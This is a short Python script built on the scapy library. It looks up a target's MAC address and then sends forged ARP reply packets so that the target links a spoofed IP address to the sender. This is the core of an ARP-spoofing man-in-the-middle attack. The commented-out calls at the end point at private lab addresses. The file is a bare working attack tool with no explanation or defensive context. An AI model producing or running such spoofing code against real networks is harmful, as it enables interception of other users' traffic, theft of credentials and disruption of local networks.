import scapy.all as scapy

def getmac(ip):
    arp_re = scapy.ARP(pdst=ip)
    source_def= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final = source_def/arp_re
    ans = scapy.srp(final,timeout=1,verbose=False)[0]
    return ans[0][1].hwsrc
   

def sendpacket(targetip,spoofip):
    mac = getmac(targetip)
    packet = scapy.ARP(pdst=targetip,hwdst=mac,op=2,psrc=spoofip)
    scapy.send(packet)



#sendpacket("192.168.47.157","192.168.47.147")
#getmac("192.168.47.157")